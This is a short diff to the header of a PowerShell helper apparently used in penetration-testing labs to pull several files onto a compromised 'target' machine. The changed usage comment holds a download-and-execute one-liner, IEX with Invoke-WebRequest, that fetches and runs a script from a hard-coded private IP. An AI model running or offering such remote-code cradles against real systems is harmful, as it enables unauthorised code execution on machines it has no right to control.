@@ -1,7 +1,8 @@
 #This script is to be used from another machine.
 #Allows to download multiple files at once
 #usage on target: 
-## On powershell -> IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/multi-download.ps1');"
+## On powershell -> IEX(iwr -uri http://192.168.45.164/multi-download.ps1 -usebasicparsing)
+
 
 
 $baseurl = "http://192.168.45.164/"
